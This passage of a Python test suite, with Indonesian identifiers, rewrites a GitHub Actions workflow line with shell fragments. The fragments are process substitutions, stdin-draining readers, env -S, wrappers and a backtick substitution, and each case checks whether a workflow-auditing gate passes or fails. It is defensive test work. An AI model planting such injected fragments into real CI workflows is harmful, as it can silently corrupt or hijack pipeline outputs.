        with open(berkas_aksi59, "w", encoding="utf-8") as f:
            f.write(isi_baru59)
        rc, out = jalan(subkuras, [sys.executable, GERBANG, "--semua"])
        periksa("penulis kedua kehabisan stdin tak terkredit: gerbang "
                "gagal (Audit 931)", rc != 0)
        shutil.rmtree(subkuras, ignore_errors=True)

        kurungekspansi = klon(tmp, "kurungekspansi")
        berkas_aksi60 = os.path.join(
            kurungekspansi, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi60, encoding="utf-8") as f:
            isi_aksi60 = f.read()
        baris_tulis60 = [b for b in isi_aksi60.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru60 = isi_aksi60.replace(
                baris_tulis60,
                baris_tulis60.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG" {a,b}c; }'), 1)
        assert isi_baru60 != isi_aksi60, \
            "suntikan aksi60 tidak menembak"
        with open(berkas_aksi60, "w", encoding="utf-8") as f:
            f.write(isi_baru60)
        rc, out = jalan(kurungekspansi,
                        [sys.executable, GERBANG, "--semua"])
        periksa("kurung tutup ekspansi kurung bukan kurung argumen "
                "yatim: gerbang lolos (Audit 933)", rc == 0)
        shutil.rmtree(kurungekspansi, ignore_errors=True)

        kurungtempel = klon(tmp, "kurungtempel")
        berkas_aksi61 = os.path.join(
            kurungtempel, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi61, encoding="utf-8") as f:
            isi_aksi61 = f.read()
        baris_tulis61 = [b for b in isi_aksi61.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru61 = isi_aksi61.replace(
                baris_tulis61,
                baris_tulis61.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG" x}; }'), 1)
        assert isi_baru61 != isi_aksi61, \
            "suntikan aksi61 tidak menembak"
        with open(berkas_aksi61, "w", encoding="utf-8") as f:
            f.write(isi_baru61)
        rc, out = jalan(kurungtempel,
                        [sys.executable, GERBANG, "--semua"])
        periksa("kurung menempel kata tanpa redirect sendiri sah "
                "bila penutup mengikuti: gerbang lolos (Audit 933)",
                rc == 0)
        shutil.rmtree(kurungtempel, ignore_errors=True)

        subberkas = klon(tmp, "subberkas")
        berkas_aksi62 = os.path.join(
            subberkas, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi62, encoding="utf-8") as f:
            isi_aksi62 = f.read()
        baris_tulis62 = [b for b in isi_aksi62.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru62 = isi_aksi62.replace(
                baris_tulis62,
                baris_tulis62.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat /tmp/berkas > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru62 != isi_aksi62, \
            "suntikan aksi62 tidak menembak"
        with open(berkas_aksi62, "w", encoding="utf-8") as f:
            f.write(isi_baru62)
        rc, out = jalan(subberkas, [sys.executable, GERBANG, "--semua"])
        periksa("pembaca berargumen berkas tak menguras stdin: "
                "gerbang lolos (Audit 934)", rc == 0)
        shutil.rmtree(subberkas, ignore_errors=True)

        sublingkar = klon(tmp, "sublingkar")
        berkas_aksi63 = os.path.join(
            sublingkar, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi63, encoding="utf-8") as f:
            isi_aksi63 = f.read()
        baris_tulis63 = [b for b in isi_aksi63.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru63 = isi_aksi63.replace(
                baris_tulis63,
                baris_tulis63.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(while read l; do echo "$l" > /dev/null; '
                    'done; cat >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru63 != isi_aksi63, \
            "suntikan aksi63 tidak menembak"
        with open(berkas_aksi63, "w", encoding="utf-8") as f:
            f.write(isi_baru63)
        rc, out = jalan(sublingkar, [sys.executable, GERBANG, "--semua"])
        periksa("lingkar while-read menguras stdin: penulis pembaca "
                "sesudahnya tak terkredit (Audit 935)", rc != 0)
        shutil.rmtree(sublingkar, ignore_errors=True)

        kurungtikus = klon(tmp, "kurungtikus")
        berkas_aksi64 = os.path.join(
            kurungtikus, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi64, encoding="utf-8") as f:
            isi_aksi64 = f.read()
        baris_tulis64 = [b for b in isi_aksi64.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru64 = isi_aksi64.replace(
                baris_tulis64,
                baris_tulis64.replace(
                    'echo "tag_mentah=$TAG"',
                    '{ echo "tag_mentah=$TAG" {a`echo }` }'), 1)
        assert isi_baru64 != isi_aksi64, \
            "suntikan aksi64 tidak menembak"
        with open(berkas_aksi64, "w", encoding="utf-8") as f:
            f.write(isi_baru64)
        rc, out = jalan(kurungtikus, [sys.executable, GERBANG, "--semua"])
        periksa("kurung buka kata sebelumnya tak menyerap kurung "
                "yatim sesudah backtick: gerbang gagal (Audit 936)",
                rc != 0)
        shutil.rmtree(kurungtikus, ignore_errors=True)

        subbungkus = klon(tmp, "subbungkus")
        berkas_aksi65 = os.path.join(
            subbungkus, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi65, encoding="utf-8") as f:
            isi_aksi65 = f.read()
        baris_tulis65 = [b for b in isi_aksi65.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru65 = isi_aksi65.replace(
                baris_tulis65,
                baris_tulis65.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(LC_ALL=C cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru65 != isi_aksi65, \
            "suntikan aksi65 tidak menembak"
        with open(berkas_aksi65, "w", encoding="utf-8") as f:
            f.write(isi_baru65)
        rc, out = jalan(subbungkus, [sys.executable, GERBANG, "--semua"])
        periksa("penguras berawalan variabel lingkungan tetap "
                "menguras: gerbang gagal (Audit 937)", rc != 0)
        shutil.rmtree(subbungkus, ignore_errors=True)

        subopsi = klon(tmp, "subopsi")
        berkas_aksi66 = os.path.join(
            subopsi, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi66, encoding="utf-8") as f:
            isi_aksi66 = f.read()
        baris_tulis66 = [b for b in isi_aksi66.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru66 = isi_aksi66.replace(
                baris_tulis66,
                baris_tulis66.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(sort -k 2 > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru66 != isi_aksi66, \
            "suntikan aksi66 tidak menembak"
        with open(berkas_aksi66, "w", encoding="utf-8") as f:
            f.write(isi_baru66)
        rc, out = jalan(subopsi, [sys.executable, GERBANG, "--semua"])
        periksa("nilai opsi sort -k bukan operand berkas: gerbang "
                "gagal (Audit 938)", rc != 0)
        shutil.rmtree(subopsi, ignore_errors=True)

        subkutip = klon(tmp, "subkutip")
        berkas_aksi67 = os.path.join(
            subkutip, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi67, encoding="utf-8") as f:
            isi_aksi67 = f.read()
        baris_tulis67 = [b for b in isi_aksi67.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru67 = isi_aksi67.replace(
                baris_tulis67,
                baris_tulis67.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat "a>b" > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru67 != isi_aksi67, \
            "suntikan aksi67 tidak menembak"
        with open(berkas_aksi67, "w", encoding="utf-8") as f:
            f.write(isi_baru67)
        rc, out = jalan(subkutip, [sys.executable, GERBANG, "--semua"])
        periksa("operand berkutip memuat > adalah berkas, bukan "
                "redirect: gerbang lolos (Audit 939)", rc == 0)
        shutil.rmtree(subkutip, ignore_errors=True)

        subkunci = klon(tmp, "subkunci")
        berkas_aksi68 = os.path.join(
            subkunci, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi68, encoding="utf-8") as f:
            isi_aksi68 = f.read()
        baris_tulis68 = [b for b in isi_aksi68.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru68 = isi_aksi68.replace(
                baris_tulis68,
                baris_tulis68.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(for i in 1; do cat > /dev/null; done; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru68 != isi_aksi68, \
            "suntikan aksi68 tidak menembak"
        with open(berkas_aksi68, "w", encoding="utf-8") as f:
            f.write(isi_baru68)
        rc, out = jalan(subkunci, [sys.executable, GERBANG, "--semua"])
        periksa("penguras di badan lingkar sesudah do tetap "
                "menguras: gerbang gagal (Audit 940)", rc != 0)
        shutil.rmtree(subkunci, ignore_errors=True)

        subputus = klon(tmp, "subputus")
        berkas_aksi69 = os.path.join(
            subputus, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi69, encoding="utf-8") as f:
            isi_aksi69 = f.read()
        baris_tulis69 = [b for b in isi_aksi69.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru69 = isi_aksi69.replace(
                baris_tulis69,
                baris_tulis69.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(while read l; do break; done; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru69 != isi_aksi69, \
            "suntikan aksi69 tidak menembak"
        with open(berkas_aksi69, "w", encoding="utf-8") as f:
            f.write(isi_baru69)
        rc, out = jalan(subputus, [sys.executable, GERBANG, "--semua"])
        periksa("break mengakhiri lingkar baca lebih awal: penulis "
                "tetap menulis sisa stdin (Audit 941)", rc == 0)
        shutil.rmtree(subputus, ignore_errors=True)

        subdone = klon(tmp, "subdone")
        berkas_aksi70 = os.path.join(
            subdone, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi70, encoding="utf-8") as f:
            isi_aksi70 = f.read()
        baris_tulis70 = [b for b in isi_aksi70.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru70 = isi_aksi70.replace(
                baris_tulis70,
                baris_tulis70.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(while read l; do echo "$l" > /dev/null; '
                    "'done'; cat >> \"$GITHUB_OUTPUT\"; done)"), 1)
        assert isi_baru70 != isi_aksi70, \
            "suntikan aksi70 tidak menembak"
        with open(berkas_aksi70, "w", encoding="utf-8") as f:
            f.write(isi_baru70)
        rc, out = jalan(subdone, [sys.executable, GERBANG, "--semua"])
        periksa("'done' berkutip adalah perintah biasa di badan "
                "lingkar: gerbang lolos (Audit 942)", rc == 0)
        shutil.rmtree(subdone, ignore_errors=True)

        subenv = klon(tmp, "subenv")
        berkas_aksi71 = os.path.join(
            subenv, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi71, encoding="utf-8") as f:
            isi_aksi71 = f.read()
        baris_tulis71 = [b for b in isi_aksi71.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru71 = isi_aksi71.replace(
                baris_tulis71,
                baris_tulis71.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(env -i cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru71 != isi_aksi71, \
            "suntikan aksi71 tidak menembak"
        with open(berkas_aksi71, "w", encoding="utf-8") as f:
            f.write(isi_baru71)
        rc, out = jalan(subenv, [sys.executable, GERBANG, "--semua"])
        periksa("penguras di balik opsi env tetap menguras: gerbang "
                "gagal (Audit 951)", rc != 0)
        shutil.rmtree(subenv, ignore_errors=True)

        subkutipsebagian = klon(tmp, "subkutipsebagian")
        berkas_aksi72 = os.path.join(
            subkutipsebagian, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi72, encoding="utf-8") as f:
            isi_aksi72 = f.read()
        baris_tulis72 = [b for b in isi_aksi72.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru72 = isi_aksi72.replace(
                baris_tulis72,
                baris_tulis72.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat a">b" > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru72 != isi_aksi72, \
            "suntikan aksi72 tidak menembak"
        with open(berkas_aksi72, "w", encoding="utf-8") as f:
            f.write(isi_baru72)
        rc, out = jalan(subkutipsebagian, [sys.executable, GERBANG,
                                           "--semua"])
        periksa("operand berkutip sebagian memuat > adalah berkas, "
                "bukan redirect: gerbang lolos (Audit 952)", rc == 0)
        shutil.rmtree(subkutipsebagian, ignore_errors=True)

        subpycache = klon(tmp, "subpycache")
        folder_cache = os.path.join(subpycache, "tools", "__pycache__")
        os.makedirs(folder_cache)
        with open(os.path.join(folder_cache,
                               "verifikasi-patch.cpython-311.pyc"),
                  "wb") as f:
            f.write(b"\x42\x0d\x0d\x0a" + b"\x00" * 32)
        rc, out = jalan(subpycache, [sys.executable, GERBANG, "--semua"])
        periksa("sisa __pycache__ tak mengubah vonis gerbang: lolos "
                "(Audit 954)", rc == 0)
        shutil.rmtree(subpycache, ignore_errors=True)

        subbungkusnilai = klon(tmp, "subbungkusnilai")
        berkas_aksi73 = os.path.join(
            subbungkusnilai, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi73, encoding="utf-8") as f:
            isi_aksi73 = f.read()
        baris_tulis73 = [b for b in isi_aksi73.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru73 = isi_aksi73.replace(
                baris_tulis73,
                baris_tulis73.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(nice -n 5 cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru73 != isi_aksi73, \
            "suntikan aksi73 tidak menembak"
        with open(berkas_aksi73, "w", encoding="utf-8") as f:
            f.write(isi_baru73)
        rc, out = jalan(subbungkusnilai,
                        [sys.executable, GERBANG, "--semua"])
        periksa("nilai opsi pembungkus bukan perintah: penguras di "
                "balik nice -n tetap menguras, gerbang gagal "
                "(Audit 957)", rc != 0)
        shutil.rmtree(subbungkusnilai, ignore_errors=True)

        subteekutip = klon(tmp, "subteekutip")
        berkas_aksi74 = os.path.join(
            subteekutip, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi74, encoding="utf-8") as f:
            isi_aksi74 = f.read()
        baris_tulis74 = [b for b in isi_aksi74.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru74 = isi_aksi74.replace(
                baris_tulis74,
                baris_tulis74.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tee "keluaran.txt" > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru74 != isi_aksi74, \
            "suntikan aksi74 tidak menembak"
        with open(berkas_aksi74, "w", encoding="utf-8") as f:
            f.write(isi_baru74)
        rc, out = jalan(subteekutip,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand tee berkutip tetap keluaran: tee tetap "
                "menguras, gerbang gagal (Audit 958)", rc != 0)
        shutil.rmtree(subteekutip, ignore_errors=True)

        submerekat = klon(tmp, "submerekat")
        berkas_aksi75 = os.path.join(
            submerekat, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi75, encoding="utf-8") as f:
            isi_aksi75 = f.read()
        baris_tulis75 = [b for b in isi_aksi75.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru75 = isi_aksi75.replace(
                baris_tulis75,
                baris_tulis75.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cat keluaran.txt>log1; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru75 != isi_aksi75, \
            "suntikan aksi75 tidak menembak"
        with open(berkas_aksi75, "w", encoding="utf-8") as f:
            f.write(isi_baru75)
        rc, out = jalan(submerekat,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand merekat ke redirect adalah berkas yang "
                "dibaca: penulis tetap menerima stdin, gerbang "
                "lolos (Audit 959)", rc == 0)
        shutil.rmtree(submerekat, ignore_errors=True)

        subenvs = klon(tmp, "subenvs")
        berkas_aksi76 = os.path.join(
            subenvs, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi76, encoding="utf-8") as f:
            isi_aksi76 = f.read()
        baris_tulis76 = [b for b in isi_aksi76.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru76 = isi_aksi76.replace(
                baris_tulis76,
                baris_tulis76.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(env -S cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru76 != isi_aksi76, \
            "suntikan aksi76 tidak menembak"
        with open(berkas_aksi76, "w", encoding="utf-8") as f:
            f.write(isi_baru76)
        rc, out = jalan(subenvs, [sys.executable, GERBANG, "--semua"])
        periksa("nilai env -S adalah perintah yang dijalankan: "
                "tetap menguras, gerbang gagal (Audit 960)", rc != 0)
        shutil.rmtree(subenvs, ignore_errors=True)

        subcommandv = klon(tmp, "subcommandv")
        berkas_aksi77 = os.path.join(
            subcommandv, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi77, encoding="utf-8") as f:
            isi_aksi77 = f.read()
        baris_tulis77 = [b for b in isi_aksi77.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru77 = isi_aksi77.replace(
                baris_tulis77,
                baris_tulis77.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(command -v cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru77 != isi_aksi77, \
            "suntikan aksi77 tidak menembak"
        with open(berkas_aksi77, "w", encoding="utf-8") as f:
            f.write(isi_baru77)
        rc, out = jalan(subcommandv,
                        [sys.executable, GERBANG, "--semua"])
        periksa("command -v hanya bertanya, tak menjalankan: "
                "penulis tetap menerima stdin, gerbang lolos "
                "(Audit 961)", rc == 0)
        shutil.rmtree(subcommandv, ignore_errors=True)

        subxargsa = klon(tmp, "subxargsa")
        berkas_aksi78 = os.path.join(
            subxargsa, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi78, encoding="utf-8") as f:
            isi_aksi78 = f.read()
        baris_tulis78 = [b for b in isi_aksi78.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru78 = isi_aksi78.replace(
                baris_tulis78,
                baris_tulis78.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xargs -a daftar cat > /dev/null; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru78 != isi_aksi78, \
            "suntikan aksi78 tidak menembak"
        with open(berkas_aksi78, "w", encoding="utf-8") as f:
            f.write(isi_baru78)
        rc, out = jalan(subxargsa, [sys.executable, GERBANG, "--semua"])
        periksa("item xargs -a adalah operand anak, bukan stdin: "
                "penulis tetap menerima stdin, gerbang lolos "
                "(Audit 962)", rc == 0)
        shutil.rmtree(subxargsa, ignore_errors=True)

        subenvsredir = klon(tmp, "subenvsredir")
        berkas_aksi79 = os.path.join(
            subenvsredir, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi79, encoding="utf-8") as f:
            isi_aksi79 = f.read()
        baris_tulis79 = [b for b in isi_aksi79.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru79 = isi_aksi79.replace(
                baris_tulis79,
                baris_tulis79.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(env -S 'cat > /dev/null'; cat "
                    ">> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru79 != isi_aksi79, \
            "suntikan aksi79 tidak menembak"
        with open(berkas_aksi79, "w", encoding="utf-8") as f:
            f.write(isi_baru79)
        rc, out = jalan(subenvsredir,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect di dalam string env -S adalah operand "
                "harfiah: penulis tetap menerima stdin, gerbang "
                "lolos (Audit 963)", rc == 0)
        shutil.rmtree(subenvsredir, ignore_errors=True)

        subenvsarang = klon(tmp, "subenvsarang")
        berkas_aksi80 = os.path.join(
            subenvsarang, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi80, encoding="utf-8") as f:
            isi_aksi80 = f.read()
        baris_tulis80 = [b for b in isi_aksi80.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru80 = isi_aksi80.replace(
                baris_tulis80,
                baris_tulis80.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(env -S 'env -S cat > x'; cat "
                    ">> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru80 != isi_aksi80, \
            "suntikan aksi80 tidak menembak"
        with open(berkas_aksi80, "w", encoding="utf-8") as f:
            f.write(isi_baru80)
        rc, out = jalan(subenvsarang,
                        [sys.executable, GERBANG, "--semua"])
        periksa("batas argv diwariskan di env -S bersarang: "
                "redirect string terdalam tetap operand, gerbang "
                "lolos (Audit 964)", rc == 0)
        shutil.rmtree(subenvsarang, ignore_errors=True)

        subredirdepan = klon(tmp, "subredirdepan")
        berkas_aksi81 = os.path.join(
            subredirdepan, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi81, encoding="utf-8") as f:
            isi_aksi81 = f.read()
        baris_tulis81 = [b for b in isi_aksi81.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru81 = isi_aksi81.replace(
                baris_tulis81,
                baris_tulis81.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(> /dev/null cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru81 != isi_aksi81, \
            "suntikan aksi81 tidak menembak"
        with open(berkas_aksi81, "w", encoding="utf-8") as f:
            f.write(isi_baru81)
        rc, out = jalan(subredirdepan,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect di depan perintah tidak lagi menyembunyikan "
                "pembaca: penulis menguras stdin, gerbang gagal "
                "(Audit 965)", rc != 0)
        shutil.rmtree(subredirdepan, ignore_errors=True)

        subtawar = klon(tmp, "subtawar")
        berkas_aksi82 = os.path.join(
            subtawar, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi82, encoding="utf-8") as f:
            isi_aksi82 = f.read()
        baris_tulis82 = [b for b in isi_aksi82.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru82 = isi_aksi82.replace(
                baris_tulis82,
                baris_tulis82.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nice A=1 cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru82 != isi_aksi82, \
            "suntikan aksi82 tidak menembak"
        with open(berkas_aksi82, "w", encoding="utf-8") as f:
            f.write(isi_baru82)
        rc, out = jalan(subtawar,
                        [sys.executable, GERBANG, "--semua"])
        periksa("penetapan sesudah pembungkus non-env adalah nama "
                "program: gerbang lolos (Audit 966)", rc == 0)
        shutil.rmtree(subtawar, ignore_errors=True)

        subredfd = klon(tmp, "subredfd")
        berkas_aksi83 = os.path.join(
            subredfd, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi83, encoding="utf-8") as f:
            isi_aksi83 = f.read()
        baris_tulis83 = [b for b in isi_aksi83.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru83 = isi_aksi83.replace(
                baris_tulis83,
                baris_tulis83.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(3> /dev/null cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru83 != isi_aksi83, \
            "suntikan aksi83 tidak menembak"
        with open(berkas_aksi83, "w", encoding="utf-8") as f:
            f.write(isi_baru83)
        rc, out = jalan(subredfd,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect ber-fd di depan perintah tidak lagi "
                "menyembunyikan pembaca: gerbang gagal (Audit 967)",
                rc != 0)
        shutil.rmtree(subredfd, ignore_errors=True)

        subrednilai = klon(tmp, "subrednilai")
        berkas_aksi84 = os.path.join(
            subrednilai, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi84, encoding="utf-8") as f:
            isi_aksi84 = f.read()
        baris_tulis84 = [b for b in isi_aksi84.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru84 = isi_aksi84.replace(
                baris_tulis84,
                baris_tulis84.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(timeout -s > /dev/null KILL 5 cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru84 != isi_aksi84, \
            "suntikan aksi84 tidak menembak"
        with open(berkas_aksi84, "w", encoding="utf-8") as f:
            f.write(isi_baru84)
        rc, out = jalan(subrednilai,
                        [sys.executable, GERBANG, "--semua"])
        periksa("redirect yang menyela nilai opsi tidak lagi "
                "menelan perintah: gerbang gagal (Audit 968)",
                rc != 0)
        shutil.rmtree(subrednilai, ignore_errors=True)

        subenvtawar = klon(tmp, "subenvtawar")
        berkas_aksi85 = os.path.join(
            subenvtawar, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi85, encoding="utf-8") as f:
            isi_aksi85 = f.read()
        baris_tulis85 = [b for b in isi_aksi85.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru85 = isi_aksi85.replace(
                baris_tulis85,
                baris_tulis85.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nice env A=1 cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru85 != isi_aksi85, \
            "suntikan aksi85 tidak menembak"
        with open(berkas_aksi85, "w", encoding="utf-8") as f:
            f.write(isi_baru85)
        rc, out = jalan(subenvtawar,
                        [sys.executable, GERBANG, "--semua"])
        periksa("env sesudah pembungkus memulihkan penetapan: "
                "penulis menguras stdin, gerbang gagal (Audit 969)",
                rc != 0)
        shutil.rmtree(subenvtawar, ignore_errors=True)

        subbungkusbaru = klon(tmp, "subbungkusbaru")
        berkas_aksi86 = os.path.join(
            subbungkusbaru, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi86, encoding="utf-8") as f:
            isi_aksi86 = f.read()
        baris_tulis86 = [b for b in isi_aksi86.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru86 = isi_aksi86.replace(
                baris_tulis86,
                baris_tulis86.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(setsid cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru86 != isi_aksi86, \
            "suntikan aksi86 tidak menembak"
        with open(berkas_aksi86, "w", encoding="utf-8") as f:
            f.write(isi_baru86)
        rc, out = jalan(subbungkusbaru,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pembungkus setsid kini dikenal resolver: penulis "
                "menguras stdin, gerbang gagal (Audit 970)",
                rc != 0)
        shutil.rmtree(subbungkusbaru, ignore_errors=True)

        subxargssendiri = klon(tmp, "subxargssendiri")
        berkas_aksi87 = os.path.join(
            subxargssendiri, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi87, encoding="utf-8") as f:
            isi_aksi87 = f.read()
        baris_tulis87 = [b for b in isi_aksi87.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru87 = isi_aksi87.replace(
                baris_tulis87,
                baris_tulis87.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(xargs echo; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru87 != isi_aksi87, \
            "suntikan aksi87 tidak menembak"
        with open(berkas_aksi87, "w", encoding="utf-8") as f:
            f.write(isi_baru87)
        rc, out = jalan(subxargssendiri,
                        [sys.executable, GERBANG, "--semua"])
        periksa("xargs tanpa -a menguras stdin sendiri walau "
                "anaknya bukan pembaca: gerbang gagal (Audit 971)",
                rc != 0)
        shutil.rmtree(subxargssendiri, ignore_errors=True)

        subcommandprog = klon(tmp, "subcommandprog")
        berkas_aksi88 = os.path.join(
            subcommandprog, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi88, encoding="utf-8") as f:
            isi_aksi88 = f.read()
        baris_tulis88 = [b for b in isi_aksi88.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru88 = isi_aksi88.replace(
                baris_tulis88,
                baris_tulis88.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(nice command cat; "
                    "cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru88 != isi_aksi88, \
            "suntikan aksi88 tidak menembak"
        with open(berkas_aksi88, "w", encoding="utf-8") as f:
            f.write(isi_baru88)
        rc, out = jalan(subcommandprog,
                        [sys.executable, GERBANG, "--semua"])
        periksa("'command' di balik pembungkus adalah program tak "
                "ada: penulis sah lolos, gerbang lolos (Audit 972)",
                rc == 0)
        shutil.rmtree(subcommandprog, ignore_errors=True)

        subtutupout = klon(tmp, "subtutupout")
        berkas_aksi89 = os.path.join(
            subtutupout, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi89, encoding="utf-8") as f:
            isi_aksi89 = f.read()
        baris_tulis89 = [b for b in isi_aksi89.splitlines()
